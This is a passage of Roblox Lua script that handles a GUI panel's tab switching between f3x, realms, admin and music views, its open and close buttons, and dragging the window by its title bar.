adminTab.MouseButton1Click:Connect(function()
    f3xScroll.Visible = false
    realmsScroll.Visible = false
    adminScroll.Visible = true
    musicScroll.Visible = false
end)

musicTab.MouseButton1Click:Connect(function()
    f3xScroll.Visible = false
    realmsScroll.Visible = false
    adminScroll.Visible = false
    musicScroll.Visible = true
end)

iconButton.MouseButton1Click:Connect(function()
    screenGui.Enabled = not screenGui.Enabled
end)

closeButton.MouseButton1Click:Connect(function()
    screenGui.Enabled = false
end)

local dragging = false
local dragInput, dragStart, startPos
local function dragUpdate(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

titleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        dragUpdate(input)
    end
end)

updateCanvasSizes()
